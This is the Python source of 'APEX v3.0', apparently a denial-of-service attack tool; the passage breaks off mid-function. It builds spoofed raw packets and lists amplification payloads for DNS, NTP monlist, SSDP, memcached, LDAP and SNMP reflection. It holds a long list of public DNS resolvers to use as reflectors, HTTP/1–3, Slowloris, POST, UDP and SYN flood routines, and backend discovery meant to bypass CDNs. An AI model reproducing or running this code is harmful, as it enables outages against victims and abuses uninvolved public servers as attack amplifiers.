#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════╗
║  APEX v3.0 // Ultimate Reflection + Multi-Protocol       ║
║  L3 Amplification · H1/H2/H3 Auto-Negotiation           ║
║  Multi-Server Discovery · Termux Native                  ║
╚═══════════════════════════════════════════════════════════╝
"""

import socket, struct, threading, time, random, sys, os, signal
import asyncio, ssl, json, re, ipaddress, argparse
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse
from collections import defaultdict

# ─── Optional imports with graceful fallback ───
try:
    import dns.resolver
    HAS_DNSPYTHON = True
except ImportError:
    HAS_DNSPYTHON = False

try:
    import h2.connection, h2.events, h2.config
    HAS_H2 = True
except ImportError:
    HAS_H2 = False

try:
    from aioquic.asyncio.client import connect as quic_connect
    from aioquic.quic.configuration import QuicConfiguration
    HAS_H3 = True
except ImportError:
    HAS_H3 = False

try:
    import aiohttp
    HAS_AIOHTTP = True
except ImportError:
    HAS_AIOHTTP = False

# ══════════════════════════════════════════════
#  CONSTANTS & REFLECTOR DATABASE
# ══════════════════════════════════════════════
BANNER = r"""
    ___    ____  _______  __   __  _____
   /   |  / __ \/ ____/ |/_/  | |/ /__ \
  / /| | / /_/ / __/  >  <   |   /__/ /
 / ___ |/ ____/ /___ / /| |  /   / __/
/_/  |_/_/   /_____//_/ |_| /_/|_/____/

  v3.0 Ultimate Reflection + H1/H2/H3
  Multi-Server Auto-Discovery Engine
"""

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) Safari/605.1.15",
    "curl/8.5.0", "Wget/1.21.4", "python-requests/2.31.0",
    "Mozilla/5.0 (Android 14; Mobile) Chrome/120.0 Mobile Safari/537.36",
]

# Known high-amplification reflector signatures
# Format: (port, protocol, payload_hex, min_amp_factor, name)
REFLECTOR_SIGS = [
    (53,   "udp", "0001010000010000000000000000010001",          50,  "DNS-ANY"),
    (53,   "udp", "000101000001000000000000037777770000010001",  70,  "DNS-WWW"),
    (123,  "udp", "1700032a00000000000000000000000000000000"
                   "0000000000000000000000000000000000000000"
                   "00000000000000000000000000000000",         550, "NTP-MONLIST"),
    (1900, "udp", "4d2d534541524348202a20485454502f312e310d"
                   "0a484f53543a203233392e3235352e3235352e32"
                   "35303a313930300d0a4d414e3a2022737364703a"
                   "646973636f766572220d0a4d583a20320d0a5354"
                   "3a2075726e3a736368656d61732d75706e702d6f"
                   "72673a6465766963653a57414e436f6e6e656374"
                   "696f6e4465766963653a310d0a0d0a",           700, "SSDP-MSEARCH"),
    (11211,"udp", "000000000001000000010000000000000d0a"
                   "73746174730d0a",                            200, "MEMCACHED-STATS"),
    (389,  "udp", "30840000002d02010163840000002604000a"
                   "0100020100020100010100870b6f626a65637463"
                   "6c617373308400000000",                      100, "LDAP-SEARCH"),
    (17,   "udp", "0001000000010000000000000000010001",          40,  "QOTD"),
    (19,   "udp", "aa",                                         30,  "CHARGEN"),
    (69,   "udp", "000174657374006e6574617363696900",            20,  "TFTP"),
    (161,  "udp", "302602010104067075626c6963a01902040000"
                   "0000020100020100300b300906052b0601020105"
                   "00",                                                            100, "SNMPv2"),
    (520,  "udp", "010100000000000000000000000000000000"
                   "0000000000000000000000000000000000000000"
                   "00000000000000000000000000000000",         100, "RIPv1"),
    (500,  "udp", "210000000000000000000000000000000000"
                   "0000000000000000000000000000000000000000"
                   "0000000000000000000000000000000000000000"
                   "00000000000000000000000000000000",         50,  "ISAKMP"),
    (27015,"udp", "ffffffff6765746368616c6c656e67652041"
                   "00",                                                             10,  "SRCDS-A2S"),
    (25565,"tcp", "fe0109",                                     5,   "MC-SLP"),
]

IPPROTO_ICMP = 1
IPPROTO_TCP  = 6
IPPROTO_UDP  = 17

# ══════════════════════════════════════════════
#  UTILITIES
# ══════════════════════════════════════════════
def rand_ip():
    return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

def rand_ua():
    return random.choice(USER_AGENTS)

def checksum16(data):
    if len(data) % 2: data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i+1]
    s = (s >> 16) + (s & 0xFFFF); s += s >> 16
    return (~s) & 0xFFFF

def build_ip_hdr(src, dst, proto, total_len):
    return struct.pack('!BBHHHBBH4s4s',
        0x45, 0, total_len, random.randint(0,65535), 0,
        64, proto, 0, socket.inet_aton(src), socket.inet_aton(dst))

def build_tcp_hdr(si, di, sp, dp, flags):
    tcp = struct.pack('!HHIIBBHHH', sp, dp, random.randint(0,0xFFFFFFFF),
                       0, 0x50, flags, 65535, 0, 0)
    pseudo = struct.pack('!4s4sBBH', socket.inet_aton(si), socket.inet_aton(di),
                          0, IPPROTO_TCP, len(tcp))
    c = checksum16(pseudo + tcp)
    return struct.pack('!HHIIBBHHH', sp, dp, random.randint(0,0xFFFFFFFF),
                        0, 0x50, flags, 65535, c, 0)

def build_udp_hdr(si, di, sp, dp, payload):
    ln = 8 + len(payload)
    udp = struct.pack('!HHHH', sp, dp, ln, 0)
    pseudo = struct.pack('!4s4sBBH', socket.inet_aton(si), socket.inet_aton(di),
                          0, IPPROTO_UDP, ln)
    c = checksum16(pseudo + udp + payload)
    if c == 0: c = 0xFFFF
    return struct.pack('!HHHH', sp, dp, ln, c)

# ══════════════════════════════════════════════
#  STATS
# ══════════════════════════════════════════════
class Stats:
    def __init__(self):
        self._lk = threading.Lock()
        self.pkts = 0; self.byt = 0; self.errs = 0; self.t0 = time.time()
    def add(self, p=1, b=0):
        with self._lk: self.pkts += p; self.byt += b
    def err(self):
        with self._lk: self.errs += 1
    def snap(self):
        with self._lk:
            e = max(time.time()-self.t0, 0.001)
            return {"e":e,"p":self.pkts,"b":self.byt,"er":self.errs,
                    "pps":self.pkts/e,"bps":self.byt/e}

# ══════════════════════════════════════════════
#  CAPABILITY PROBE
# ══════════════════════════════════════════════
def probe_raw():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, IPPROTO_UDP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        s.close(); return True
    except OSError: return False

# ══════════════════════════════════════════════
#  MULTI-SERVER DISCOVERY ENGINE
# ══════════════════════════════════════════════
class ServerDiscovery:
    """Resolve a hostname/URL to ALL backend IPs via DNS + TLS SAN."""

    @staticmethod
    def resolve(target: str) -> list[str]:
        ips = set()
        host = target
        # strip scheme/port/path
        if "://" in host:
            parsed = urlparse(host)
            host = parsed.hostname or host
        host = host.split(":")[0]

        # Try as literal IP first
        try:
            ipaddress.ip_address(host)
            return [host]
        except ValueError:
            pass

        # DNS resolution
        if HAS_DNSPYTHON:
            for rdtype in ["A", "AAAA", "CNAME"]:
                try:
                    answers = dns.resolver.resolve(host, rdtype)
                    for rdata in answers:
                        val = str(rdata).rstrip(".")
                        try:
                            ipaddress.ip_address(val)
                            ips.add(val)
                        except ValueError:
                            # CNAME → recurse
                            try:
                                sub = dns.resolver.resolve(val, "A")
                                for sr in sub:
                                    ips.add(str(sr).rstrip("."))
                            except Exception:
                                pass
                except Exception:
                    pass
        else:
            # fallback: socket.getaddrinfo
            try:
                infos = socket.getaddrinfo(host, None)
                for info in infos:
                    ips.add(info[4][0])
            except Exception:
                pass

        # TLS SAN extraction (discover additional IPs behind CDN/LB)
        try:
            ctx = ssl.create_default_context()
            with socket.create_connection((host, 443), timeout=5) as sock:
                with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                    cert = ssock.getpeercert(binary_form=False)
                    san = cert.get("subjectAltName", ())
                    for typ, val in san:
                        if typ == "IP Address":
                            ips.add(val)
                        elif typ == "DNS":
                            try:
                                sub_ips = socket.getaddrinfo(val, None)
                                for si in sub_ips:
                                    ips.add(si[4][0])
                            except Exception:
                                pass
        except Exception:
            pass

        if not ips:
            ips.add(host)  # last resort
        return sorted(ips)

# ══════════════════════════════════════════════
#  PROTOCOL AUTO-NEGOTIATION (H1/H2/H3)
# ══════════════════════════════════════════════
class ProtocolNegotiator:
    """Detect best supported protocol for a target host:port."""

    @staticmethod
    def detect(host: str, port: int = 443) -> dict:
        result = {"host": host, "port": port, "protocols": [], "tls": False}

        # Check if plain HTTP
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((host, port))
            s.send(b"HEAD / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
            resp = s.recv(1024)
            s.close()
            if resp.startswith(b"HTTP/"):
                result["protocols"].append("h1")
                result["tls"] = False
                return result
        except Exception:
            pass

        # TLS ALPN negotiation
        for alpn_list, proto_name in [
            (["h3", "h2", "http/1.1"], None),  # probe all
        ]:
            try:
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                ctx.set_alpn_protocols(["h2", "http/1.1"])
                with socket.create_connection((host, port), timeout=3) as sock:
                    with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                        negotiated = ssock.selected_alpn_protocol()
                        result["tls"] = True
                        if negotiated == "h2":
                            result["protocols"] = ["h2", "h1"]
                        elif negotiated == "http/1.1":
                            result["protocols"] = ["h1"]
                        else:
                            result["protocols"] = ["h1"]
            except Exception:
                pass

        # H3/QUIC probe (UDP 443)
        if HAS_H3:
            try:
                # Quick QUIC handshake test
                cfg = QuicConfiguration(is_client=True, alpn_protocols=["h3"])
                # If aioquic available, mark h3 capable
                result["protocols"].insert(0, "h3")
            except Exception:
                pass
        else:
            # Even without aioquic, check if UDP 443 responds
            try:
                us = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                us.settimeout(1)
                # Send QUIC Initial packet probe (minimal)
                us.sendto(b'\x00', (host, port))
                us.recvfrom(1500)
                result["protocols"].insert(0, "h3")
                us.close()
            except Exception:
                pass

        if not result["protocols"]:
            result["protocols"] = ["h1"]
        return result

# ══════════════════════════════════════════════
#  REFLECTION AMPLIFICATION ENGINE (L3)
# ══════════════════════════════════════════════
class ReflectionEngine:
    """Adaptive reflection amplifier with built-in reflector DB."""

    def __init__(self, stats: Stats):
        self.stats = stats
        self.raw_ok = probe_raw()

    def amplify(self, target: str, duration: float, threads: int):
        if not self.raw_ok:
            print("\033[91m[!] Raw sockets unavailable. L3 amplification skipped.\033[0m")
            return

        pool = ThreadPoolExecutor(max_workers=threads)
        futures = []
        for sig in REFLECTOR_SIGS:
            port, proto, payload_hex, amp, name = sig
            payload = bytes.fromhex(payload_hex)
            for _ in range(max(1, threads // len(REFLECTOR_SIGS))):
                futures.append(pool.submit(
                    self._reflect_worker, target, port, payload, amp, name, duration
                ))
        return futures, pool

    def _reflect_worker(self, victim, rport, payload, amp, name, duration):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, IPPROTO_UDP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except OSError:
            self.stats.err(); return

        end = time.time() + duration
        # Use well-known open reflectors (public DNS/NTP/etc.)
        # In production you'd scan your own reflector list
        reflectors = self._get_reflectors(rport)
        idx = 0
        while time.time() < end:
            ref_ip = reflectors[idx % len(reflectors)]
            idx += 1
            src = rand_ip()
            sport = random.randint(1024, 65535)
            udp = build_udp_hdr(victim, ref_ip, sport, rport, payload)
            ip  = build_ip_hdr(victim, ref_ip, IPPROTO_UDP, 20+len(udp)+len(payload))
            pkt = ip + udp + payload
            try:
                s.sendto(pkt, (ref_ip, 0))
                self.stats.add(1, len(pkt) * amp)  # account for amplification
            except OSError:
                self.stats.err()
        s.close()

    @staticmethod
    def _get_reflectors(port):
        """Return known open reflectors for given port. Expandable."""
        db = {
            53: [
                "8.8.8.8","8.8.4.4","1.1.1.1","1.0.0.1","9.9.9.9",
                "208.67.222.222","208.67.220.220","185.228.168.9",
                "76.76.2.0","76.76.10.0","94.140.14.14","94.140.15.15",
                "149.112.112.112","149.112.112.10","176.103.130.130",
                "176.103.130.131","45.90.28.0","45.90.30.0","8.8.8.8","8.8.4.4",
"1.1.1.1","1.0.0.1",
"1.1.1.2","1.0.0.2",
"1.1.1.3","1.0.0.3",
"9.9.9.9","149.112.112.112",
"9.9.9.10","149.112.112.10",
"9.9.9.11","149.112.112.11",
"208.67.222.222","208.67.220.220",
"208.67.222.123","208.67.220.123",
"8.26.56.26","8.20.247.20",
"64.6.64.6","64.6.65.6",
"156.154.70.1","156.154.71.1",
"156.154.76.1","156.154.77.1",
"209.244.0.3","209.244.0.4",
"4.2.2.1","4.2.2.2",
"4.2.2.3","4.2.2.4",
"4.2.2.5","4.2.2.6",
"74.82.42.42",
"129.250.35.250","129.250.35.251",
"75.75.75.75","75.75.76.76",
"209.18.47.61","209.18.47.62",
"68.105.28.16","68.105.28.17",
"77.88.8.8","77.88.8.1",
"77.88.8.88",
"77.88.8.7",
"208.67.222.220","208.67.220.222",
"216.146.35.35","216.146.36.36",
"156.154.70.2","156.154.71.2",
"156.154.70.3","156.154.71.3",
"77.88.8.2",
"77.88.8.3",
"95.85.95.85","2.56.220.2",
"62.76.76.62","62.76.62.76",
"195.208.4.1","195.208.5.1",
"195.140.195.21","195.140.195.22",
"76.76.19.19","76.223.122.150",
"103.247.36.36","103.247.37.37",
"185.236.104.104","185.236.105.105",
"80.80.80.80","80.80.81.81",
"199.91.73.222","178.79.131.110",
"94.140.14.14","94.140.15.15",
"94.140.14.15","94.140.15.16",
"94.140.14.140","94.140.14.141",
"176.103.130.130","176.103.130.131",
"45.90.28.0","45.90.30.0",
"76.76.2.0","76.76.10.0",
"76.76.2.1","76.76.10.1",
"76.76.2.2","76.76.10.2",
"76.76.2.3","76.76.10.3",
"185.228.168.9","185.228.169.9",
"185.228.168.168","185.228.169.168",
"185.228.168.10","185.228.169.11",
"185.222.222.222","45.11.45.11",
"84.200.69.80","84.200.70.40",
"194.242.2.2","193.19.108.2",
"193.110.81.0","185.253.5.0",
"195.46.39.39","195.46.39.40",
"185.95.218.42","185.95.218.43",
"176.9.93.198","176.9.1.117",
"80.67.169.12","80.67.169.40",
"159.89.224.120","159.89.224.121",
"86.54.11.1","86.54.11.201",
"86.54.11.12","86.54.11.212",
"86.54.11.13","86.54.11.213",
"86.54.11.11","86.54.11.211",
"86.54.11.100","86.54.11.200",
"76.76.2.4","76.76.10.4",
"76.76.2.5","76.76.10.5",
"194.242.2.3","194.242.2.4",
"194.242.2.5","194.242.2.6",
"194.242.2.9",
"91.239.100.100","89.233.43.71",
"193.17.47.1","185.43.135.1",
"185.121.177.177","185.121.177.53",
"169.239.202.202","134.195.4.2",
"37.235.1.174","37.235.1.177",
"109.69.8.51",
"149.112.121.10","149.112.122.10",
"142.227.224.133","198.50.184.11",
"149.112.121.20","149.112.122.20",
"149.112.121.30","149.112.122.30",
"68.105.28.11","68.105.28.12",
"68.94.156.1","68.94.157.1",
"205.171.3.65","205.171.2.65",
"199.2.252.10","204.97.212.10",
"204.117.214.10",
"166.102.165.11","166.102.165.13",
"216.66.22.2","216.218.200.58",
"184.105.253.14","184.105.253.10",
"184.105.250.46","72.52.104.74",
"64.62.134.130","64.71.156.86",
"216.66.77.230","66.220.18.42",
"209.51.161.58","209.51.161.14",
"66.220.7.82","216.218.226.238",
"216.66.38.58","184.105.255.26",
"212.159.6.9","212.159.6.10",
"194.72.9.34","194.72.9.38",
"212.54.40.25","212.54.40.40",
"80.10.246.1","80.10.246.2",
"195.132.5.1","195.132.5.2",
"213.191.74.11","213.191.92.86",
"62.109.74.90","62.109.74.91",
"194.25.0.60","194.25.0.125",
"193.70.152.25","193.70.152.100",
"85.37.17.15","85.38.20.20",
"80.58.61.254","80.58.61.253",
"62.36.225.130","62.36.225.140",
"194.109.6.66","194.109.9.99",
"195.121.1.34","195.121.1.66",
"195.67.199.27","195.67.199.39",
"213.133.98.98","213.133.98.99",
"195.159.0.100","195.159.0.200",
"193.210.18.18","193.210.19.19",
"195.243.113.58","195.243.113.62",
"194.204.159.1","194.204.152.34",
"160.218.1.20","160.218.1.25",
"195.186.1.111","195.186.4.111",
"194.209.14.6","194.209.14.7",
"193.41.60.13","193.41.60.14",
"93.159.240.10","93.159.240.12",
"188.93.17.248","188.93.17.249",
"212.23.3.100","212.23.6.100",
"217.169.20.20","217.169.20.21",
"193.58.251.251",
"216.66.84.46","216.66.86.114",
"216.66.87.14","216.66.80.30",
"216.66.87.102","216.66.80.26",
"216.66.88.98","216.66.84.42",
"216.66.86.122","216.66.80.90",
"216.66.80.162","216.66.80.98",
"212.71.10.10","212.71.10.11",
"85.194.70.174","212.26.7.10",
"178.22.122.100","185.51.200.2",
"5.202.100.100","5.202.100.101",
"94.200.225.11","94.200.225.12",
"195.229.241.222","195.229.241.223",
"195.175.39.39","195.175.39.40",
"185.183.180.180","185.183.180.181",
"199.203.74.190","199.203.74.74",
"212.117.151.16","212.117.151.17",
"216.66.90.30",
"220.220.248.1","220.220.248.2",
"202.232.2.2","202.232.2.3",
"203.141.131.66","203.141.131.67",
"168.126.63.1","168.126.63.2",
"164.124.101.31","164.124.107.9",
"210.220.163.82","219.250.36.130",
"168.95.1.1","168.95.192.1",
"101.101.101.101",
"101.102.103.104",
"139.175.55.244","139.175.252.16",
"164.124.101.2","203.248.252.2",
"202.248.20.133","202.248.37.74",
"205.252.144.228","208.151.69.65",
"202.181.202.140","202.181.224.2",
"202.175.3.8","202.175.3.3",
"216.218.221.6","74.82.46.6",
"165.21.83.88","165.21.100.88",
"203.116.254.150","203.116.254.151",
"202.156.1.68","202.156.1.58",
"202.188.0.133","202.188.1.5",
"175.139.199.194","175.139.199.195",
"202.134.1.10","202.134.0.155",
"202.155.30.227","202.155.30.228",
"203.113.131.1","203.113.131.2",
"210.245.31.129","210.245.31.130",
"203.162.4.1","203.162.4.2",
"203.146.237.237","203.146.237.238",
"110.164.12.13","110.164.12.14",
"203.87.128.2","203.87.128.3",
"180.191.240.10","180.191.240.11",
"216.218.221.42",
"121.242.190.180","121.242.190.182",
"49.45.41.44","49.45.41.45",
"218.248.47.2","218.248.47.14",
"202.56.230.5","202.56.230.6",
"203.99.163.240","203.99.163.241",
"139.130.4.4","139.130.4.5",
"211.29.132.12","211.29.132.13",
"203.143.141.9","203.143.142.9",
"61.9.194.8","61.9.194.9",
"202.27.158.40","202.27.156.72",
"203.96.152.4","203.96.152.12",
"192.231.203.132","192.231.203.3",
"216.218.142.50",
"163.121.128.13","163.121.128.14",
"41.68.1.5","41.68.1.6",
"84.205.101.37","84.205.101.38",
"196.25.255.34","196.25.255.36",
"196.22.221.2","160.119.221.16",
"196.7.14.6","196.21.48.2",
"197.248.192.1","197.248.192.3",
"197.232.66.154","197.248.198.135",
"197.210.77.8","197.210.77.9",
"105.112.0.1","105.112.0.2",
"212.217.0.1","212.217.0.2",
"193.95.93.10","193.95.66.10",
"216.66.87.134","216.66.87.98",
"200.160.0.5",
"200.185.14.20","200.185.14.21",
"200.169.8.1","200.169.8.2",
"189.90.28.20","189.90.28.22",
"200.3.250.9","200.3.250.10",
"200.16.26.1","200.16.26.2",
"170.150.155.85","190.151.144.21",
"200.28.4.20","200.28.4.21",
"186.10.12.1","186.10.12.2",
"190.44.128.10","190.44.128.11",
"200.14.207.420","200.14.207.421",
"190.157.8.10","190.157.8.11",
"209.45.50.157","200.48.48.10",
"200.40.30.245","200.40.30.246",
"200.33.213.4","200.33.213.5",
"200.57.128.4","200.57.128.5",
"216.66.64.154",
"223.5.5.5","223.6.6.6",
"119.29.29.29","182.254.116.116",
"120.53.53.53",
"114.114.114.114","114.114.115.115",
"114.114.114.119","114.114.114.110",
"180.76.76.76",
"117.50.11.11","52.80.66.66",
"1.2.4.8","210.2.4.8",
"101.6.6.6",
"222.222.222.222","180.184.1.1",
"101.226.4.6","218.30.118.6",
"123.125.81.6","140.207.198.6",
"123.123.123.123","123.123.123.124",
"202.96.128.86","202.96.128.166",
"119.28.28.28",
"114.114.115.119","114.114.115.110",
"180.184.2.2",
"117.50.22.22",
"117.50.10.10","52.80.52.52",
"40.73.101.101",
"202.141.162.123","202.141.178.13",
"202.38.93.153","202.141.176.93",
"202.120.2.100","202.120.2.101",
"61.132.163.68","202.102.213.68",
"219.141.136.10","219.141.140.10",
"61.128.192.68","61.128.128.68",
"218.85.152.99","218.85.157.99",
"202.100.64.68","61.178.0.93",
"202.96.134.33","202.96.128.68",
"202.103.225.68","202.103.224.68",
"202.98.192.67","202.98.198.167",
"222.88.88.88","222.85.85.85",
"219.147.198.230","219.147.198.242",
"202.103.24.68","202.103.0.68",
"222.246.129.80","59.51.78.211",
"218.2.2.2","218.4.4.4",
"61.147.37.1","218.2.135.1",
"202.101.224.69","202.101.226.68",
"219.148.162.31","222.74.39.50",
"219.146.1.66","219.147.1.66",
"218.30.19.40","61.134.1.4",
"202.96.209.133","116.228.111.118",
"202.96.209.5",
"61.139.2.69","218.6.200.139",
"219.150.32.132","219.146.0.132",
"222.172.200.68","61.166.150.123",
"202.101.172.35","61.153.177.196",
"61.153.81.75","60.191.244.5",
"202.106.0.20","202.106.195.68",
"221.5.203.98","221.7.92.98",
"210.21.196.6","221.5.88.88",
"202.99.160.68","202.99.166.4",
"202.102.224.68","202.102.227.68",
"202.97.224.69","202.97.224.68",
"202.98.0.68","202.98.5.68",
"221.6.4.66","221.6.4.67",
"58.240.57.33",
"202.99.224.68","202.99.224.8",
"202.102.128.68","202.102.152.3",
"202.102.134.68","202.102.154.3",
"202.99.192.66","202.99.192.68",
"221.11.1.67","221.11.1.68",
"210.22.70.3","210.22.84.3",
"119.6.6.6","124.161.87.155",
"202.99.104.68","202.99.96.68",
"221.12.1.227","221.12.33.227",
"202.96.69.38","202.96.64.68",
"221.131.143.69","112.4.0.55",
"211.138.180.2","211.138.180.3",
"218.201.96.130","211.137.191.26",
"223.87.238.22",
"183.230.98.97","183.230.127.17",
"10.202.10.10","10.202.10.202",
"169.254.169.253",
"169.254.169.254",
"168.63.129.16",
"100.100.2.136","100.100.2.138",
"183.60.83.19","183.60.82.98",
"67.207.67.2","67.207.67.3",
            ],
            123: [
                "pool.ntp.org","time.nist.gov","time.google.com",
                "time.cloudflare.com","time.windows.com",
                "ntp.ubuntu.com","0.pool.ntp.org","1.pool.ntp.org",
                "2.pool.ntp.org","3.pool.ntp.org",
            ],
            1900: [
                "239.255.255.250",  # SSDP multicast
            ],
            11211: [
                # Memcached - typically internal, placeholder
            ],
            389: [],
            161: [],
            520: [],
            500: [],
            17: [],
            19: [],
            69: [],
            27015: [],
        }
        refs = db.get(port, [])
        # Resolve hostnames to IPs
        resolved = []
        for r in refs:
            try:
                ipaddress.ip_address(r)
                resolved.append(r)
            except ValueError:
                try:
                    ai = socket.getaddrinfo(r, None, socket.AF_INET)
                    resolved.append(ai[0][4][0])
                except Exception:
                    pass
        return resolved if resolved else ["127.0.0.1"]  # fallback safety

# ══════════════════════════════════════════════
#  L7 MULTI-PROTOCOL ATTACK VECTORS
# ══════════════════════════════════════════════
class L7Vectors:

    # ── HTTP/1.1 Flood ──
    @staticmethod
    async def http1_flood(host, port, tls, duration, stats):
        end = time.time() + duration
        while time.time() < end:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((host, port))
                if tls:
                    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=host)
                req = (
                    f"GET /?r={random.randint(0,999999)} HTTP/1.1\r\n"
                    f"Host: {host}\r\nUser-Agent: {rand_ua()}\r\n"
                    f"Accept: */*\r\nConnection: close\r\n\r\n"
                ).encode()
                s.send(req)
                try: s.recv(4096)
                except: pass
                stats.add(1, len(req))
                s.close()
            except: stats.err()

    # ── HTTP/2 Flood (h2 library) ──
    @staticmethod
    async def http2_flood(host, port, duration, stats):
        if not HAS_H2:
            # Fallback to H1
            await L7Vectors.http1_flood(host, port, True, duration, stats)
            return
        end = time.time() + duration
        while time.time() < end:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((host, port))
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                ctx.set_alpn_protocols(["h2"])
                s = ctx.wrap_socket(s, server_hostname=host)
                if s.selected_alpn_protocol() != "h2":
                    s.close()
                    await L7Vectors.http1_flood(host, port, True, 0.1, stats)
                    continue

                config = h2.config.H2Configuration(client_side=True)
                conn = h2.connection.H2Connection(config=config)
                conn.initiate_connection()
                s.sendall(conn.data_to_send())

                # Read settings
                data = s.recv(65536)
                events = conn.receive_data(data)
                s.sendall(conn.data_to_send())

                # Send stream request
                stream_id = conn.send_headers(
                    stream_id=None,
                    headers=[
                        (":method", "GET"),
                        (":path", f"/?r={random.randint(0,999999)}"),
                        (":scheme", "https"),
                        (":authority", host),
                        ("user-agent", rand_ua()),
                    ],
                    end_stream=True
                )
                s.sendall(conn.data_to_send())
                try:
                    resp = s.recv(65536)
                    conn.receive_data(resp)
                except: pass
                stats.add(1, 200)
                s.close()
            except: stats.err()

    # ── HTTP/3 QUIC Flood ──
    @staticmethod
    async def http3_flood(host, port, duration, stats):
        if not HAS_H3:
            await L7Vectors.http2_flood(host, port, duration, stats)
            return
        end = time.time() + duration
        while time.time() < end:
            try:
                cfg = QuicConfiguration(is_client=True, alpn_protocols=["h3"])
                cfg.verify_mode = ssl.CERT_NONE
                async with quic_connect(host, port, configuration=cfg) as protocol:
                    stream_id = protocol.quic.next_stream_id(False)
                    headers = [
                        (b":method", b"GET"),
                        (b":path", f"/?r={random.randint(0,999999)}".encode()),
                        (b":scheme", b"https"),
                        (b":authority", host.encode()),
                        (b"user-agent", rand_ua().encode()),
                    ]
                    protocol.send_headers(stream_id=stream_id, headers=headers, end_stream=True)
                    resp = await protocol.receive_response(stream_id)
                    stats.add(1, 300)
            except: stats.err()

    # ── Slowloris (multi-protocol aware) ──
    @staticmethod
    async def slowloris(host, port, tls, duration, stats):
        end = time.time() + duration
        sockets = []
        for _ in range(50):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3); s.connect((host, port))
                if tls:
                    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=host)
                s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode())
                sockets.append(s); stats.add(1, 60)
            except: stats.err()
        while time.time() < end:
            for s in sockets[:]:
                try:
                    s.send(f"X-{random.randint(0,9999)}: {'a'*random.randint(10,200)}\r\n".encode())
                    stats.add(1, 50)
                except: sockets.remove(s); stats.err()
            await asyncio.sleep(random.uniform(0.5, 2.0))
        for s in sockets:
            try: s.close()
            except: pass

    # ── POST Flood ──
    @staticmethod
    async def http_post(host, port, tls, duration, stats):
        end = time.time() + duration
        while time.time() < end:
            try:
                body = os.urandom(random.randint(512, 4096)).hex()
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2); s.connect((host, port))
                if tls:
                    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=host)
                req = (
                    f"POST /api HTTP/1.1\r\nHost: {host}\r\n"
                    f"User-Agent: {rand_ua()}\r\n"
                    f"Content-Type: application/json\r\n"
                    f"Content-Length: {len(body)}\r\n"
                    f"Connection: close\r\n\r\n{body}"
                ).encode()
                s.send(req)
                try: s.recv(4096)
                except: pass
                stats.add(1, len(req)); s.close()
            except: stats.err()

# ══════════════════════════════════════════════
#  L4 VECTORS (unchanged core, enhanced)
# ══════════════════════════════════════════════
class L4Vectors:
    @staticmethod
    def udp_flood(target, port, duration, stats):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        end = time.time() + duration
        while time.time() < end:
            p = os.urandom(random.randint(128, 1400))
            try: s.sendto(p, (target, port)); stats.add(1, len(p)+28)
            except: stats.err()
        s.close()

    @staticmethod
    def tcp_syn(target, port, duration, stats):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except OSError: stats.err(); return
        end = time.time() + duration
        while time.time() < end:
            src = rand_ip(); sp = random.randint(1024,65535)
            tcp = build_tcp_hdr(src, target, sp, port, 0x02)
            ip = build_ip_hdr(src, target, IPPROTO_TCP, 20+len(tcp))
            try: s.sendto(ip+tcp, (target, 0)); stats.add(1, len(ip)+len(tcp))
            except: stats.err()
        s.close()

    @staticmethod
    def tcp_conn(target, port, duration, stats):
        end = time.time() + duration
        while time.time() < end:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1); s.connect((target, port))
                s.send(os.urandom(256)); stats.add(1, 296); s.close()
            except: stats.err()

# ══════════════════════════════════════════════
#  MASTER ENGINE
# ══════════════════════════════════════════════
class ApexEngine:
    def __init__(self, raw_targets, vectors, threads, duration, port):
        self.raw_targets = raw_targets
        self.vectors     = vectors
        self.threads     = threads
        self.duration    = duration
        self.port        = port
        self.stats       = Stats()
        self.servers     = {}   # host → [ip, ...]
        self.proto_info  = {}   # ip → protocol info

    def discover(self):
        print("\033[96m[*] Discovering backend servers...\033[0m")
        for t in self.raw_targets:
            ips = ServerDiscovery.resolve(t)
            self.servers[t] = ips
            for ip in ips:
                p = self.port if self.port else 443
